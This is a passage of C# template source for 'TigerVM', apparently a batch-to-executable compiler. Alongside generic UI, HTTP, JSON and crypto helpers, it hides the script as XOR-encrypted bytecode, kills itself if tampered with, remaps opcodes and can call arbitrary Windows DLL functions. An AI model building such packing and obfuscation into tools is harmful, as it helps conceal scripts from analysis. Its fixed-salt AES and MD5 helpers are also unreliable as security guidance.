                System.Windows.Forms.MessageBoxIcon icon = System.Windows.Forms.MessageBoxIcon.Information;
                if (iconStr.Equals("Warning", StringComparison.OrdinalIgnoreCase)) icon = System.Windows.Forms.MessageBoxIcon.Warning;
                else if (iconStr.Equals("Error", StringComparison.OrdinalIgnoreCase)) icon = System.Windows.Forms.MessageBoxIcon.Error;
                else if (iconStr.Equals("Question", StringComparison.OrdinalIgnoreCase)) icon = System.Windows.Forms.MessageBoxIcon.Question;

                var res = System.Windows.Forms.MessageBox.Show(text, title, buttons, icon);
                return res.ToString();
            }}
            catch {{ return "Error"; }}
        }}

        public static string ShowInputBox(string prompt, string defaultText, string title)
        {{
            try
            {{
                using (var form = new System.Windows.Forms.Form())
                {{
                    form.Text = string.IsNullOrEmpty(title) ? "TigerVM Input" : title;
                    form.Width = 420;
                    form.Height = 170;
                    form.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;
                    form.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
                    form.MaximizeBox = false;
                    form.MinimizeBox = false;

                    var lbl = new System.Windows.Forms.Label() {{ Left = 16, Top = 16, Width = 370, Text = prompt }};
                    var txt = new System.Windows.Forms.TextBox() {{ Left = 16, Top = 42, Width = 370, Text = defaultText }};
                    var btnOk = new System.Windows.Forms.Button() {{ Text = "OK", Left = 220, Width = 80, Top = 80, DialogResult = System.Windows.Forms.DialogResult.OK }};
                    var btnCancel = new System.Windows.Forms.Button() {{ Text = "Cancel", Left = 306, Width = 80, Top = 80, DialogResult = System.Windows.Forms.DialogResult.Cancel }};

                    form.Controls.Add(lbl);
                    form.Controls.Add(txt);
                    form.Controls.Add(btnOk);
                    form.Controls.Add(btnCancel);
                    form.AcceptButton = btnOk;
                    form.CancelButton = btnCancel;

                    return form.ShowDialog() == System.Windows.Forms.DialogResult.OK ? txt.Text : "";
                }}
            }}
            catch {{ return ""; }}
        }}

        public static string ShowFileDialog(string title, string filter, string mode)
        {{
            try
            {{
                if (mode.Equals("save", StringComparison.OrdinalIgnoreCase))
                {{
                    using (var sfd = new System.Windows.Forms.SaveFileDialog())
                    {{
                        sfd.Title = title;
                        sfd.Filter = string.IsNullOrEmpty(filter) ? "All Files (*.*)|*.*" : filter;
                        return sfd.ShowDialog() == System.Windows.Forms.DialogResult.OK ? sfd.FileName : "";
                    }}
                }}
                else
                {{
                    using (var ofd = new System.Windows.Forms.OpenFileDialog())
                    {{
                        ofd.Title = title;
                        ofd.Filter = string.IsNullOrEmpty(filter) ? "All Files (*.*)|*.*" : filter;
                        return ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK ? ofd.FileName : "";
                    }}
                }}
            }}
            catch {{ return ""; }}
        }}
    }}

    public static class TigerHttp
    {{
        public static string Get(string url, int timeoutMs)
        {{
            try
            {{
                var req = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(url);
                req.Timeout = timeoutMs > 0 ? timeoutMs : 10000;
                req.UserAgent = "TigerVM/8.0";
                using (var resp = req.GetResponse())
                using (var stream = resp.GetResponseStream())
                using (var reader = new StreamReader(stream, Encoding.UTF8))
                {{
                    return reader.ReadToEnd();
                }}
            }}
            catch (Exception ex)
            {{
                return "HTTP_ERROR: " + ex.Message;
            }}
        }}

        public static string Post(string url, string payload, string contentType, int timeoutMs)
        {{
            try
            {{
                var req = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(url);
                req.Method = "POST";
                req.Timeout = timeoutMs > 0 ? timeoutMs : 10000;
                req.ContentType = string.IsNullOrEmpty(contentType) ? "application/json" : contentType;
                req.UserAgent = "TigerVM/8.0";
                byte[] data = Encoding.UTF8.GetBytes(payload ?? "");
                req.ContentLength = data.Length;
                using (var reqStream = req.GetRequestStream())
                {{
                    reqStream.Write(data, 0, data.Length);
                }}
                using (var resp = req.GetResponse())
                using (var stream = resp.GetResponseStream())
                using (var reader = new StreamReader(stream, Encoding.UTF8))
                {{
                    return reader.ReadToEnd();
                }}
            }}
            catch (Exception ex)
            {{
                return "HTTP_ERROR: " + ex.Message;
            }}
        }}
    }}

    public static class TigerNotify
    {{
        public static void ShowToast(string title, string msg, int timeoutSec, string iconStr)
        {{
            try
            {{
                using (var notify = new System.Windows.Forms.NotifyIcon())
                {{
                    notify.Icon = System.Drawing.SystemIcons.Information;
                    notify.Visible = true;
                    var tipIcon = System.Windows.Forms.ToolTipIcon.Info;
                    if (iconStr.Equals("Warning", StringComparison.OrdinalIgnoreCase)) tipIcon = System.Windows.Forms.ToolTipIcon.Warning;
                    else if (iconStr.Equals("Error", StringComparison.OrdinalIgnoreCase)) tipIcon = System.Windows.Forms.ToolTipIcon.Error;
                    notify.ShowBalloonTip(timeoutSec * 1000, title, msg, tipIcon);
                    System.Threading.Thread.Sleep(500);
                }}
            }}
            catch {{ }}
        }}
    }}

    public static class TigerData
    {{
        private static readonly System.Data.DataSet _db = new System.Data.DataSet("TigerDb");
        private static readonly object _dbLock = new object();

        public static string JsonGet(string json, string path)
        {{
            try
            {{
                if (string.IsNullOrEmpty(json) || string.IsNullOrEmpty(path)) return "";
                path = path.Trim().Trim((char)34, (char)39);
                object current = ParseJson(json);
                string[] tokens = path.Split('.');
                foreach (string token in tokens)
                {{
                    if (current == null) return "";
                    string key = token;
                    int arrayIndex = -1;
                    int bOpen = token.IndexOf('[');
                    if (bOpen != -1 && token.EndsWith("]"))
                    {{
                        key = token.Substring(0, bOpen);
                        int bClose = token.IndexOf(']');
                        int.TryParse(token.Substring(bOpen + 1, bClose - bOpen - 1), out arrayIndex);
                    }}

                    if (!string.IsNullOrEmpty(key))
                    {{
                        var dict = current as Dictionary<string, object>;
                        if (dict == null || !dict.ContainsKey(key)) return "";
                        current = dict[key];
                    }}

                    if (arrayIndex >= 0)
                    {{
                        var list = current as List<object>;
                        if (list == null || arrayIndex < 0 || arrayIndex >= list.Count) return "";
                        current = list[arrayIndex];
                    }}
                }}
                return current != null ? current.ToString() : "";
            }}
            catch {{ return ""; }}
        }}

        public static string JsonSet(string json, string path, string newVal)
        {{
            try
            {{
                path = path.Trim().Trim((char)34, (char)39);
                newVal = newVal.Trim().Trim((char)34, (char)39);
                object root = string.IsNullOrEmpty(json) ? new Dictionary<string, object>() : ParseJson(json);
                if (root == null) root = new Dictionary<string, object>();
                string[] tokens = path.Split('.');
                object current = root;
                for (int i = 0; i < tokens.Length; i++)
                {{
                    string token = tokens[i];
                    string key = token;
                    int arrayIndex = -1;
                    int bOpen = token.IndexOf('[');
                    if (bOpen != -1 && token.EndsWith("]"))
                    {{
                        key = token.Substring(0, bOpen);
                        int bClose = token.IndexOf(']');
                        int.TryParse(token.Substring(bOpen + 1, bClose - bOpen - 1), out arrayIndex);
                    }}
                    bool isLast = (i == tokens.Length - 1);
                    if (current is Dictionary<string, object>)
                    {{
                        var dict = (Dictionary<string, object>)current;
                        if (!string.IsNullOrEmpty(key))
                        {{
                            if (arrayIndex >= 0)
                            {{
                                if (!dict.ContainsKey(key) || !(dict[key] is List<object>)) dict[key] = new List<object>();
                                var list = (List<object>)dict[key];
                                while (list.Count <= arrayIndex) list.Add(null);
                                if (isLast) list[arrayIndex] = newVal;
                                else
                                {{
                                    if (list[arrayIndex] == null) list[arrayIndex] = new Dictionary<string, object>();
                                    current = list[arrayIndex];
                                }}
                            }}
                            else
                            {{
                                if (isLast) dict[key] = newVal;
                                else
                                {{
                                    if (!dict.ContainsKey(key) || dict[key] == null) dict[key] = new Dictionary<string, object>();
                                    current = dict[key];
                                }}
                            }}
                        }}
                    }}
                }}
                return SerializeJson(root);
            }}
            catch {{ return json; }}
        }}

        public static string SerializeJson(object obj)
        {{
            if (obj == null) return "null";
            if (obj is string) return (char)34 + ((string)obj).Replace("\\\\", "\\\\\\\\").Replace(((char)34).ToString(), "\\\"").Replace("\\n", "\\\\n").Replace("\\r", "\\\\r") + (char)34;
            if (obj is bool) return (bool)obj ? "true" : "false";
            if (obj is Dictionary<string, object>)
            {{
                var dict = (Dictionary<string, object>)obj;
                StringBuilder sb = new StringBuilder("{{");
                bool first = true;
                foreach (var kv in dict)
                {{
                    if (!first) sb.Append(",");
                    first = false;
                    sb.Append((char)34).Append(kv.Key).Append((char)34).Append(':').Append(SerializeJson(kv.Value));
                }}
                sb.Append("}}");
                return sb.ToString();
            }}
            if (obj is List<object>)
            {{
                var list = (List<object>)obj;
                StringBuilder sb = new StringBuilder("[");
                bool first = true;
                foreach (var item in list)
                {{
                    if (!first) sb.Append(",");
                    first = false;
                    sb.Append(SerializeJson(item));
                }}
                sb.Append("]");
                return sb.ToString();
            }}
            return obj.ToString();
        }}

        public static object ParseJson(string json)
        {{
            if (string.IsNullOrEmpty(json)) return null;
            json = json.Trim();
            if (json.StartsWith(((char)34).ToString()) && json.EndsWith(((char)34).ToString()) && json.Length >= 2)
            {{
                json = json.Substring(1, json.Length - 2).Trim();
            }}
            string bq = ((char)92).ToString() + (char)34;
            if (json.Contains(bq))
            {{
                json = json.Replace(bq, ((char)34).ToString());
            }}
            int idx = 0;
            return ParseValue(json, ref idx);
        }}

        private static object ParseValue(string json, ref int idx)
        {{
            SkipWs(json, ref idx);
            if (idx >= json.Length) return null;
            char c = json[idx];
            if (c == '{{') return ParseObject(json, ref idx);
            if (c == '[') return ParseArray(json, ref idx);
            if (c == (char)34 || c == (char)39) return ParseString(json, ref idx);
            if (char.IsDigit(c) || c == '-') return ParseNumber(json, ref idx);
            if (json.Substring(idx).StartsWith("true", StringComparison.OrdinalIgnoreCase)) {{ idx += 4; return true; }}
            if (json.Substring(idx).StartsWith("false", StringComparison.OrdinalIgnoreCase)) {{ idx += 5; return false; }}
            if (json.Substring(idx).StartsWith("null", StringComparison.OrdinalIgnoreCase)) {{ idx += 4; return null; }}
            return null;
        }}

        private static Dictionary<string, object> ParseObject(string json, ref int idx)
        {{
            var dict = new Dictionary<string, object>(StringComparer.OrdinalIgnoreCase);
            idx++;
            while (idx < json.Length)
            {{
                SkipWs(json, ref idx);
                if (idx >= json.Length || json[idx] == '}}') {{ if (idx < json.Length) idx++; break; }}
                if (json[idx] == ',') {{ idx++; continue; }}
                string key = ParseString(json, ref idx);
                SkipWs(json, ref idx);
                if (idx < json.Length && json[idx] == ':') idx++;
                object val = ParseValue(json, ref idx);
                dict[key] = val;
            }}
            return dict;
        }}

        private static List<object> ParseArray(string json, ref int idx)
        {{
            var list = new List<object>();
            idx++;
            while (idx < json.Length)
            {{
                SkipWs(json, ref idx);
                if (idx >= json.Length || json[idx] == ']') {{ if (idx < json.Length) idx++; break; }}
                if (json[idx] == ',') {{ idx++; continue; }}
                object val = ParseValue(json, ref idx);
                list.Add(val);
            }}
            return list;
        }}

        private static string ParseString(string json, ref int idx)
        {{
            char quote = json[idx++];
            var sb = new StringBuilder();
            while (idx < json.Length)
            {{
                char c = json[idx++];
                if (c == quote) break;
                if (c == '\\\\' && idx < json.Length)
                {{
                    char esc = json[idx++];
                    if (esc == 'n') sb.Append((char)10);
                    else if (esc == 'r') sb.Append((char)13);
                    else if (esc == 't') sb.Append((char)9);
                    else if (esc == 'b') sb.Append((char)8);
                    else if (esc == 'f') sb.Append((char)12);
                    else if (esc == 'u' && idx + 4 <= json.Length)
                    {{
                        string hex = json.Substring(idx, 4);
                        int code;
                        if (int.TryParse(hex, System.Globalization.NumberStyles.HexNumber, null, out code)) {{ sb.Append((char)code); idx += 4; }}
                        else sb.Append(esc);
                    }}
                    else sb.Append(esc);
                }}
                else sb.Append(c);
            }}
            return sb.ToString();
        }}

        private static object ParseNumber(string json, ref int idx)
        {{
            int start = idx;
            while (idx < json.Length && (char.IsDigit(json[idx]) || json[idx] == '.' || json[idx] == '-' || json[idx] == '+' || json[idx] == 'e' || json[idx] == 'E')) idx++;
            return json.Substring(start, idx - start);
        }}

        private static void SkipWs(string json, ref int idx)
        {{
            while (idx < json.Length && char.IsWhiteSpace(json[idx])) idx++;
        }}

        public static bool SqlExec(string sql)
        {{
            try
            {{
                sql = (sql ?? "").Trim().Trim((char)34);
                lock (_dbLock)
                {{
                    if (sql.StartsWith("CREATE TABLE", StringComparison.OrdinalIgnoreCase))
                    {{
                        int pStart = sql.IndexOf('(');
                        int pEnd = sql.LastIndexOf(')');
                        string tableName = sql.Substring(12, pStart - 12).Trim();
                        string colsRaw = sql.Substring(pStart + 1, pEnd - pStart - 1);
                        var dt = new System.Data.DataTable(tableName);
                        foreach (string c in colsRaw.Split(','))
                        {{
                            string colName = c.Trim().Split(new char[]{{' '}}, StringSplitOptions.RemoveEmptyEntries)[0];
                            dt.Columns.Add(colName, typeof(string));
                        }}
                        if (_db.Tables.Contains(tableName)) _db.Tables.Remove(tableName);
                        _db.Tables.Add(dt);
                        return true;
                    }}
                    else if (sql.StartsWith("INSERT INTO", StringComparison.OrdinalIgnoreCase))
                    {{
                        int vIdx = sql.IndexOf("VALUES", StringComparison.OrdinalIgnoreCase);
                        string tableName = sql.Substring(11, vIdx - 11).Trim();
                        int pStart = sql.IndexOf('(', vIdx);
                        int pEnd = sql.LastIndexOf(')');
                        string valsRaw = sql.Substring(pStart + 1, pEnd - pStart - 1);
                        var dt = _db.Tables[tableName];
                        if (dt != null)
                        {{
                            var row = dt.NewRow();
                            List<string> vals = SplitSqlValues(valsRaw);
                            for (int i = 0; i < vals.Count && i < dt.Columns.Count; i++)
                            {{
                                row[i] = vals[i];
                            }}
                            dt.Rows.Add(row);
                            return true;
                        }}
                    }}
                }}
            }}
            catch {{ }}
            return false;
        }}

        private static List<string> SplitSqlValues(string raw)
        {{
            List<string> res = new List<string>();
            StringBuilder cur = new StringBuilder();
            bool inQuotes = false; char qChar = (char)0;
            for (int i = 0; i < raw.Length; i++)
            {{
                char c = raw[i];
                if ((c == (char)39 || c == (char)34) && (!inQuotes || c == qChar))
                {{
                    inQuotes = !inQuotes; qChar = inQuotes ? c : (char)0;
                }}
                else if (c == ',' && !inQuotes)
                {{
                    res.Add(cur.ToString().Trim().Trim((char)39, (char)34));
                    cur.Length = 0;
                }}
                else
                {{
                    cur.Append(c);
                }}
            }}
            if (cur.Length > 0) res.Add(cur.ToString().Trim().Trim((char)39, (char)34));
            return res;
        }}

        public static string SqlQuery(string sql)
        {{
            try
            {{
                sql = (sql ?? "").Trim().Trim((char)34);
                lock (_dbLock)
                {{
                    if (sql.StartsWith("SELECT", StringComparison.OrdinalIgnoreCase))
                    {{
                        int fromIdx = sql.IndexOf("FROM", StringComparison.OrdinalIgnoreCase);
                        string selectPart = sql.Substring(6, fromIdx - 6).Trim();
                        int whereIdx = sql.IndexOf("WHERE", StringComparison.OrdinalIgnoreCase);
                        string tableName = (whereIdx != -1) ? sql.Substring(fromIdx + 4, whereIdx - (fromIdx + 4)).Trim() : sql.Substring(fromIdx + 4).Trim();
                        var dt = _db.Tables[tableName];
                        if (dt != null)
                        {{
                            string filter = (whereIdx != -1) ? sql.Substring(whereIdx + 5).Trim() : "";
                            System.Data.DataRow[] rows = string.IsNullOrEmpty(filter) ? dt.Select() : dt.Select(filter);
                            if (rows.Length > 0)
                            {{
                                if (selectPart == "*")
                                {{
                                    var items = new List<string>();
                                    foreach (var item in rows[0].ItemArray) items.Add(item.ToString());
                                    return string.Join(" | ", items.ToArray());
                                }}
                                else if (dt.Columns.Contains(selectPart))
                                {{
                                    return rows[0][selectPart].ToString();
                                }}
                            }}
                        }}
                    }}
                }}
            }}
            catch {{ }}
            return "";
        }}

        public static string ClipGet()
        {{
            try {{ return System.Windows.Forms.Clipboard.GetText(); }}
            catch {{ return ""; }}
        }}

        public static void ClipSet(string text)
        {{
            try {{ System.Windows.Forms.Clipboard.SetText((text ?? "").Trim().Trim((char)34, (char)39)); }}
            catch {{ }}
        }}
    }}

    public static class TigerCrypto
    {{
        public static string AesEncrypt(string plainText, string password)
        {{
            try
            {{
                plainText = (plainText ?? "").Trim().Trim((char)34, (char)39);
                password = (password ?? "").Trim().Trim((char)34, (char)39);
                byte[] plainBytes = Encoding.UTF8.GetBytes(plainText);
                byte[] salt = new byte[] {{ 0x54, 0x69, 0x67, 0x65, 0x72, 0x56, 0x4D, 0x37 }};
                using (Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(password, salt, 1000))
                {{
                    using (RijndaelManaged aes = new RijndaelManaged())
                    {{
                        aes.KeySize = 256;
                        aes.Key = pdb.GetBytes(32);
                        aes.IV = pdb.GetBytes(16);
                        using (MemoryStream ms = new MemoryStream())
                        {{
                            using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                            {{
                                cs.Write(plainBytes, 0, plainBytes.Length);
                                cs.Close();
                            }}
                            return Convert.ToBase64String(ms.ToArray());
                        }}
                    }}
                }}
            }}
            catch {{ return ""; }}
        }}

        public static string AesDecrypt(string cipherText, string password)
        {{
            try
            {{
                cipherText = (cipherText ?? "").Trim().Trim((char)34, (char)39);
                password = (password ?? "").Trim().Trim((char)34, (char)39);
                byte[] cipherBytes = Convert.FromBase64String(cipherText);
                byte[] salt = new byte[] {{ 0x54, 0x69, 0x67, 0x65, 0x72, 0x56, 0x4D, 0x37 }};
                using (Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(password, salt, 1000))
                {{
                    using (RijndaelManaged aes = new RijndaelManaged())
                    {{
                        aes.KeySize = 256;
                        aes.Key = pdb.GetBytes(32);
                        aes.IV = pdb.GetBytes(16);
                        using (MemoryStream ms = new MemoryStream())
                        {{
                            using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                            {{
                                cs.Write(cipherBytes, 0, cipherBytes.Length);
                                cs.Close();
                            }}
                            return Encoding.UTF8.GetString(ms.ToArray());
                        }}
                    }}
                }}
            }}
            catch {{ return ""; }}
        }}

        public static string ComputeSha256(string input)
        {{
            try
            {{
                using (SHA256 sha = SHA256.Create())
                {{
                    byte[] bytes = sha.ComputeHash(Encoding.UTF8.GetBytes(input ?? ""));
                    StringBuilder sb = new StringBuilder();
                    foreach (byte b in bytes) sb.Append(b.ToString("x2"));
                    return sb.ToString();
                }}
            }}
            catch {{ return ""; }}
        }}

        public static string ComputeMd5(string input)
        {{
            try
            {{
                using (MD5 md5 = MD5.Create())
                {{
                    byte[] bytes = md5.ComputeHash(Encoding.UTF8.GetBytes(input ?? ""));
                    StringBuilder sb = new StringBuilder();
                    foreach (byte b in bytes) sb.Append(b.ToString("x2"));
                    return sb.ToString();
                }}
            }}
            catch {{ return ""; }}
        }}

        public static string Base64Encode(string input)
        {{
            try {{ return Convert.ToBase64String(Encoding.UTF8.GetBytes(input ?? "")); }}
            catch {{ return ""; }}
        }}

        public static string Base64Decode(string b64)
        {{
            try {{ return Encoding.UTF8.GetString(Convert.FromBase64String(b64 ?? "")); }}
            catch {{ return ""; }}
        }}
    }}

    public class VmCode
    {{
        public int Op;
        public string A1;
        public string A2;
        public string A3;
        public string A4;
        public bool F1;
        public bool F2;
        public int Iv;
        public int StateId;
        public int NextStateId;
    }}

    public class Program
    {{
        private static readonly string BytecodeBlob = "{b64_bytecode}";
        private static readonly string KeyBlob = "{b64_key}";
        private static readonly string IntegritySeal = "{sha256_seal}";
        private static readonly Dictionary<byte, int> _opMap = new Dictionary<byte, int>();
        private static readonly Dictionary<string, string> EmbeddedFiles = new Dictionary<string, string>();
        private static readonly Dictionary<string, string> Variables = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
        private static readonly List<System.Threading.Thread> _activeThreads = new List<System.Threading.Thread>();
        private static readonly object _threadLock = new object();
        private static readonly Random Rnd = new Random();
        private static bool _echoOn = false;
        private static int _exitCode = 0;
        private static string[] _cliArgs = new string[0];

        [STAThread]
        static int Main(string[] args)
        {{
            Console.OutputEncoding = Encoding.UTF8;
            _cliArgs = args;
{armor_call}
            InitOpMap();
            InitEnvironment();
{embedded_files_block}
            try
            {{
                byte[] rawComp = Convert.FromBase64String(BytecodeBlob);
                VerifyIntegrity(rawComp);
                byte[] raw;
                using (MemoryStream msIn = new MemoryStream(rawComp))
                using (DeflateStream ds = new DeflateStream(msIn, CompressionMode.Decompress))
                using (MemoryStream msOut = new MemoryStream())
                {{
                    ds.CopyTo(msOut);
                    raw = msOut.ToArray();
                }}
                byte[] k = Convert.FromBase64String(KeyBlob);
                byte[] dec = Decrypt(raw, k);
                ExecuteBytecode(dec);
            }}
            catch
            {{
                _exitCode = 1;
            }}
            return _exitCode;
        }}

        private static void VerifyIntegrity(byte[] raw)
        {{
            using (SHA256 sha = SHA256.Create())
            {{
                byte[] hash = sha.ComputeHash(raw);
                string cur = BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
                if (!cur.Equals(IntegritySeal, StringComparison.OrdinalIgnoreCase))
                {{
                    Process.GetCurrentProcess().Kill();
                }}
            }}
        }}

        private static void InitOpMap()
        {{
{opmap_block}
        }}

        private static byte[] Decrypt(byte[] data, byte[] key)
        {{
            byte[] res = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {{
                res[i] = (byte)(data[i] ^ key[i % key.Length] ^ (i & 0xFF));
            }}
            return res;
        }}

        private static void InitEnvironment()
        {{
            lock (_threadLock)
            {{
                foreach (System.Collections.DictionaryEntry env in Environment.GetEnvironmentVariables())
                {{
                    Variables[env.Key.ToString()] = env.Value != null ? env.Value.ToString() : "";
                }}
                string exePath = Assembly.GetExecutingAssembly().Location;
                string exeDir = AppDomain.CurrentDomain.BaseDirectory.TrimEnd('\\\\');
                Variables["~dp0"] = exeDir + "\\\\";
                Variables["~f0"] = exePath;
                Variables["~nx0"] = Path.GetFileName(exePath);
                Variables["0"] = exePath;
                for (int i = 0; i < _cliArgs.Length && i < 9; i++)
                {{
                    Variables[(i + 1).ToString()] = _cliArgs[i];
                }}
                Variables["*"] = string.Join(" ", _cliArgs);
            }}
        }}

        private static string ExpandVars(string input)
        {{
            if (string.IsNullOrEmpty(input)) return "";
            input = Regex.Replace(input, @"%(~[a-zA-Z]*([0-9]))|%([0-9]|\\*)", m =>
            {{
                if (m.Groups[1].Success)
                {{
                    string mod = m.Groups[1].Value;
                    lock (_threadLock) {{ if (Variables.ContainsKey(mod)) return Variables[mod]; }}
                    string argNum = m.Groups[2].Value;
                    lock (_threadLock)
                    {{
                        if (Variables.ContainsKey(argNum))
                        {{
                            string targetPath = Variables[argNum];
                            if (mod.StartsWith("~dp") && !string.IsNullOrEmpty(targetPath))
                            {{
                                try {{ return Path.GetDirectoryName(Path.GetFullPath(targetPath)) + "\\\\"; }} catch {{ }}
                            }}
                            if (mod.StartsWith("~nx") && !string.IsNullOrEmpty(targetPath))
                            {{
                                try {{ return Path.GetFileName(targetPath); }} catch {{ }}
                            }}
                            if (mod.StartsWith("~f") && !string.IsNullOrEmpty(targetPath))
                            {{
                                try {{ return Path.GetFullPath(targetPath); }} catch {{ }}
                            }}
                        }}
                    }}
                    return "%" + mod;
                }}
                if (m.Groups[3].Success)
                {{
                    string argKey = m.Groups[3].Value;
                    lock (_threadLock) {{ if (Variables.ContainsKey(argKey)) return Variables[argKey]; }}
                    return "";
                }}
                return m.Value;
            }});
            input = input.Replace("%CD%", Directory.GetCurrentDirectory())
                         .Replace("%RANDOM%", Rnd.Next(0, 32767).ToString())
                         .Replace("%DATE%", DateTime.Now.ToString("yyyy-MM-dd"))
                         .Replace("%TIME%", DateTime.Now.ToString("HH:mm:ss.ff"))
                         .Replace("%ERRORLEVEL%", _exitCode.ToString());
            Func<string, string> resolveVar = (varExpr) =>
            {{
                lock (_threadLock) {{ if (Variables.ContainsKey(varExpr)) return Variables[varExpr]; }}
                if (varExpr.Contains(":~"))
                {{
                    int colon = varExpr.IndexOf(":~");
                    string vname = varExpr.Substring(0, colon);
                    string slice = varExpr.Substring(colon + 2);
                    string val = "";
                    lock (_threadLock) {{ val = Variables.ContainsKey(vname) ? Variables[vname] : Environment.GetEnvironmentVariable(vname) ?? ""; }}
                    string[] parts = slice.Split(',');
                    int start = 0; int.TryParse(parts[0], out start);
                    if (start < 0) start = Math.Max(0, val.Length + start);
                    if (start >= val.Length) return "";
                    if (parts.Length > 1)
                    {{
                        int len = 0; int.TryParse(parts[1], out len);
                        if (len < 0) len = Math.Max(0, val.Length - start + len);
                        len = Math.Min(len, val.Length - start);
                        return val.Substring(start, Math.Max(0, len));
                    }}
                    return val.Substring(start);
                }}
                if (varExpr.Contains(":") && varExpr.Contains("="))
                {{
                    int colon = varExpr.IndexOf(':');
                    string vname = varExpr.Substring(0, colon);
                    string sub = varExpr.Substring(colon + 1);
                    int eq = sub.IndexOf('=');
                    string find = sub.Substring(0, eq);
                    string repl = sub.Substring(eq + 1);
                    string val = "";
                    lock (_threadLock) {{ val = Variables.ContainsKey(vname) ? Variables[vname] : Environment.GetEnvironmentVariable(vname) ?? ""; }}
                    return val.Replace(find, repl);
                }}
                string sysEnv = Environment.GetEnvironmentVariable(varExpr);
                if (sysEnv != null) return sysEnv;
                return "";
            }};
            input = Regex.Replace(input, @"%([^%!]+)%", m => resolveVar(m.Groups[1].Value));
            input = Regex.Replace(input, @"!([^%!]+)!", m => resolveVar(m.Groups[1].Value));
            return input;
        }}

        private static long EvalMath(string expr)
        {{
            if (string.IsNullOrEmpty(expr)) return 0;
            lock (_threadLock)
            {{
                return NativeJit.Eval(expr, Variables);
            }}
        }}

        private static void ExecuteSubRoutineThread(int startIp, List<VmCode> instrs, Dictionary<string, int> labels)
        {{
            int tip = startIp;
            while (tip < instrs.Count)
            {{
                VmCode inst = instrs[tip];
                if (inst.Op == 13 || (inst.Op == 6 && inst.A1.ToLowerInvariant() == "eof")) break;
                if (inst.Op == 1)
                {{
                    lock (_threadLock) {{ Console.WriteLine(ExpandVars(inst.A1)); }}
                }}
                else if (inst.Op == 3)
                {{
                    lock (_threadLock)
                    {{
                        Variables[inst.A1] = ExpandVars(inst.A2);
                        Environment.SetEnvironmentVariable(inst.A1, Variables[inst.A1]);
                    }}
                }}
                else if (inst.Op == 4)
                {{
                    long mRes = EvalMath(inst.A2);
                    lock (_threadLock)
                    {{
                        Variables[inst.A1] = mRes.ToString();
                        Environment.SetEnvironmentVariable(inst.A1, mRes.ToString());
                    }}
                }}
                else if (inst.Op == 19)
                {{
                    System.Threading.Thread.Sleep(inst.Iv);
                }}
                else if (inst.Op == 26)
                {{
                    string dll = ExpandVars(inst.A1);
                    string fn = ExpandVars(inst.A2);
                    string args = ExpandVars(inst.A3);
                    WinApiGateway.Invoke(dll, fn, args, Variables);
                }}
                else if (inst.Op == 6)
                {{
                    string tgt = ExpandVars(inst.A1).ToLowerInvariant();
                    if (labels.ContainsKey(tgt)) {{ tip = labels[tgt]; continue; }}
                }}
                tip++;
            }}
        }}

        private static void ExecuteBytecode(byte[] bytecode)
        {{
            List<VmCode> instrs = new List<VmCode>();
            Dictionary<string, int> labels = new Dictionary<string, int>(StringComparer.OrdinalIgnoreCase);
            Dictionary<int, int> stateToIp = new Dictionary<int, int>();
            using (MemoryStream ms = new MemoryStream(bytecode))
            using (BinaryReader br = new BinaryReader(ms, Encoding.UTF8))
            {{
                byte m1 = br.ReadByte(); byte m2 = br.ReadByte(); byte m3 = br.ReadByte(); byte m4 = br.ReadByte();
                if (m1 != 0x54 || m2 != 0x47 || m3 != 0x5A || m4 != 0x56) return;
                int count = br.ReadInt32();
                for (int i = 0; i < count; i++)
                {{
                    byte mappedOp = br.ReadByte();
                    int rawOp = _opMap.ContainsKey(mappedOp) ? _opMap[mappedOp] : 0;
                    VmCode code = new VmCode();
                    code.Op = rawOp;
                    code.A1 = br.ReadString();
                    code.A2 = br.ReadString();
                    code.A3 = br.ReadString();
                    code.A4 = br.ReadString();
                    code.F1 = br.ReadBoolean();
                    code.F2 = br.ReadBoolean();
                    code.Iv = br.ReadInt32();
                    code.StateId = br.ReadInt32();
                    code.NextStateId = br.ReadInt32();
                    instrs.Add(code);
                    stateToIp[code.StateId] = i;
                    if (rawOp == 7)
                    {{
                        labels[code.A1.ToLowerInvariant()] = i;
                    }}
                }}
            }}

            Stack<int> callStack = new Stack<int>();
            Stack<int[]> tryStack = new Stack<int[]>();
            Stack<string> errVarStack = new Stack<string>();
            int ip = 0;
            int dummyState = 0;
            bool dummyBranch = false;

            {cff_init_loop}
                VmCode inst = instrs[ip];
                int op = inst.Op;
                string a1 = inst.A1;
                string a2 = inst.A2;
                string a3 = inst.A3;
                string a4 = inst.A4;
                bool f1 = inst.F1;
                bool f2 = inst.F2;
                int iv = inst.Iv;

                switch (op)
                {{
                    case 1: // Echo
                        Console.WriteLine(ExpandVars(a1));
                        break;
                    case 2: // EchoToggle
                        _echoOn = f1;
                        break;
                    case 3: // SetVar
                        lock (_threadLock) {{ Variables[a1] = ExpandVars(a2); Environment.SetEnvironmentVariable(a1, Variables[a1]); }}
                        break;
                    case 4: // SetMath
                        long mathRes = EvalMath(a2);
                        lock (_threadLock) {{ Variables[a1] = mathRes.ToString(); Environment.SetEnvironmentVariable(a1, mathRes.ToString()); }}
                        break;
                    case 5: // SetPrompt
                        if (!string.IsNullOrEmpty(a2)) Console.Write(ExpandVars(a2));
                        string pInput = Console.ReadLine();
                        lock (_threadLock) {{ Variables[a1] = pInput ?? ""; Environment.SetEnvironmentVariable(a1, Variables[a1]); }}
                        break;
                    case 6: // Goto
                        string target = ExpandVars(a1).ToLowerInvariant();
                        if (target == "eof") {{ return; }}
                        {cff_goto_body}
                        break;
                    case 7: // Label
                        break;
                    case 8: // IfCmp
                        string left = ExpandVars(a1);
                        string right = ExpandVars(a2);
                        bool match = false;
                        StringComparison sc = f2 ? StringComparison.OrdinalIgnoreCase : StringComparison.Ordinal;
                        if (a4 == "==") match = left.Equals(right, sc);
                        else
                        {{
                            long lNum = 0, rNum = 0;
                            bool bothNum = long.TryParse(left, out lNum) && long.TryParse(right, out rNum);
                            if (bothNum)
                            {{
